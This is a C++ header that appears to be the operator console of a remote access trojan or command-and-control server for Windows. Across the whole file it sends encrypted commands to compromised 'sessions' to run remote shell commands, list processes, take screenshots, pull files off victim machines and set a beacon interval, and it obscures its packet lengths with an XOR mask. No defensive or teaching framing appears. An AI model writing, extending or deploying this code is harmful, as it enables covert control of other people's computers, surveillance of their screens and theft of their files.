#pragma once
#include <winsock2.h>
#include <windows.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <thread>
#include "SessionManager.h"
#include "../Common/Protocol.h"

namespace CommandDispatcher {
    // Currently selected session
    extern uint32_t active_session_id;   

    bool send_command(uint32_t session_id, Protocol::Command cmd,
        const std::vector<uint8_t>& payload = {});
    std::pair<Protocol::Response, std::vector<uint8_t>> receive_response(uint32_t session_id, uint32_t timeout_ms = 5000);
    void cmd_shell(uint32_t session_id, const std::string& command);
    void cmd_ps(uint32_t session_id);
    void cmd_screenshot(uint32_t session_id, const std::string& save_path = "");
    void cmd_download(uint32_t session_id, const std::string& remote_path,
        const std::string& local_path = "");
    void cmd_sleep(uint32_t session_id, uint32_t ms);
    void cmd_exit(uint32_t session_id);
}

// Default active session
inline uint32_t CommandDispatcher::active_session_id = 0;


inline bool CommandDispatcher::send_command(uint32_t session_id, Protocol::Command cmd,
    const std::vector<uint8_t>& payload) {
    auto* session = SessionManager::get_session(session_id);
    if (!session) {
        printf("[-] Session #%u not found\n", session_id);
        return false;
    }

    auto packet = Protocol::create_packet(cmd, payload);
    std::vector<uint8_t> encrypted = packet;
    session->encryptor.process(encrypted.data(), encrypted.size());

    uint32_t size = static_cast<uint32_t>(encrypted.size());
    uint32_t size_enc = size ^ 0xDEADBEEF;
    if (send(session->socket, reinterpret_cast<const char*>(&size_enc), sizeof(size_enc), 0) != sizeof(size_enc)) {
        printf("[-] Failed to send to session #%u\n", session_id);
        session->active = false;
        return false;
    }
    int total = 0;
    while (total < static_cast<int>(encrypted.size())) {
        int sent = send(session->socket,
            reinterpret_cast<const char*>(encrypted.data()) + total,
            static_cast<int>(encrypted.size()) - total, 0);
        if (sent <= 0) {
            session->active = false;
            return false;
        }
        total += sent;
    }
    return true;
}

inline std::pair<Protocol::Response, std::vector<uint8_t>> CommandDispatcher::receive_response(uint32_t session_id, uint32_t timeout_ms) {
    auto* session = SessionManager::get_session(session_id);
    if (!session) return { Protocol::Response::RESP_ERROR, {} };

    DWORD timeout = timeout_ms;
    setsockopt(session->socket, SOL_SOCKET, SO_RCVTIMEO,
        reinterpret_cast<const char*>(&timeout), sizeof(timeout));

    uint32_t size_enc = 0;
    int received = recv(session->socket, reinterpret_cast<char*>(&size_enc), sizeof(size_enc), 0);
    if (received != sizeof(size_enc)) return { Protocol::Response::RESP_ERROR, {} };

    uint32_t size = size_enc ^ 0xDEADBEEF;
    if (size > 100 * 1024 * 1024) return { Protocol::Response::RESP_ERROR, {} };

    std::vector<uint8_t> encrypted(size);
    int total = 0;
    while (total < static_cast<int>(size)) {
        received = recv(session->socket,
            reinterpret_cast<char*>(encrypted.data()) + total,
            static_cast<int>(size) - total, 0);
        if (received <= 0) return { Protocol::Response::RESP_ERROR, {} };
        total += received;
    }

    session->encryptor.process(encrypted.data(), encrypted.size());

    Protocol::PacketHeader header;
    std::vector<uint8_t> payload;
    if (!Protocol::parse_packet(encrypted, header, payload)) {
        return { Protocol::Response::RESP_ERROR, {} };
    }

    return { static_cast<Protocol::Response>(header.command), payload };
}

inline void CommandDispatcher::cmd_shell(uint32_t session_id, const std::string& command) {
    printf("[*] Executing: %s\n", command.c_str());
    std::vector<uint8_t> payload(command.begin(), command.end());
    if (!send_command(session_id, Protocol::Command::CMD_SHELL, payload)) return;
    auto result = receive_response(session_id);
    Protocol::Response resp = result.first;
    std::vector<uint8_t> data = result.second;
    if (resp == Protocol::Response::RESP_TEXT) {
        std::string output(data.begin(), data.end());
        printf("%s\n", output.c_str());
    }
    else {
        printf("[-] Command failed\n");
    }
}

inline void CommandDispatcher::cmd_ps(uint32_t session_id) {
    printf("[*] Requesting process list...\n");
    if (!send_command(session_id, Protocol::Command::CMD_PS_LIST)) return;
    auto result = receive_response(session_id);
    Protocol::Response resp = result.first;
    std::vector<uint8_t> data = result.second;
    if (resp == Protocol::Response::RESP_TEXT) {
        std::string output(data.begin(), data.end());
        printf("%s\n", output.c_str());
    }
}

inline void CommandDispatcher::cmd_screenshot(uint32_t session_id, const std::string& save_path) {
    printf("[*] Requesting screenshot...\n");
    if (!send_command(session_id, Protocol::Command::CMD_SCREENSHOT)) return;
    auto result = receive_response(session_id, 10000);
    Protocol::Response resp = result.first;
    std::vector<uint8_t> data = result.second;
    if (resp == Protocol::Response::RESP_SCREENSHOT && !data.empty()) {
        std::string filename = save_path.empty() ?
            "screenshot_" + std::to_string(session_id) + ".bmp" : save_path;
        std::ofstream file(filename, std::ios::binary);
        if (file) {
            file.write(reinterpret_cast<const char*>(data.data()), data.size());
            file.close();
            printf("[+] Screenshot saved to: %s (%zu bytes)\n", filename.c_str(), data.size());
        }
    }
}

inline void CommandDispatcher::cmd_download(uint32_t session_id, const std::string& remote_path,
    const std::string& local_path) {
    printf("[*] Downloading: %s\n", remote_path.c_str());
    std::vector<uint8_t> payload(remote_path.begin(), remote_path.end());
    if (!send_command(session_id, Protocol::Command::CMD_DOWNLOAD, payload)) return;
    auto result = receive_response(session_id, 30000);
    Protocol::Response resp = result.first;
    std::vector<uint8_t> data = result.second;
    if (resp == Protocol::Response::RESP_DATA && !data.empty()) {
        std::string save_path = local_path.empty() ?
            "download_" + std::to_string(session_id) : local_path;
        std::ofstream file(save_path, std::ios::binary);
        if (file) {
            file.write(reinterpret_cast<const char*>(data.data()), data.size());
            file.close();
            printf("[+] Downloaded to: %s (%zu bytes)\n", save_path.c_str(), data.size());
        }
    }
}

inline void CommandDispatcher::cmd_sleep(uint32_t session_id, uint32_t ms) {
    printf("[*] Setting beacon interval to %u ms\n", ms);
    std::vector<uint8_t> payload(sizeof(ms));
    memcpy(payload.data(), &ms, sizeof(ms));
    send_command(session_id, Protocol::Command::CMD_SLEEP, payload);
}

inline void CommandDispatcher::cmd_exit(uint32_t session_id) {
    printf("[*] Terminating session #%u\n", session_id);
    send_command(session_id, Protocol::Command::CMD_EXIT);
    SessionManager::remove_session(session_id);
}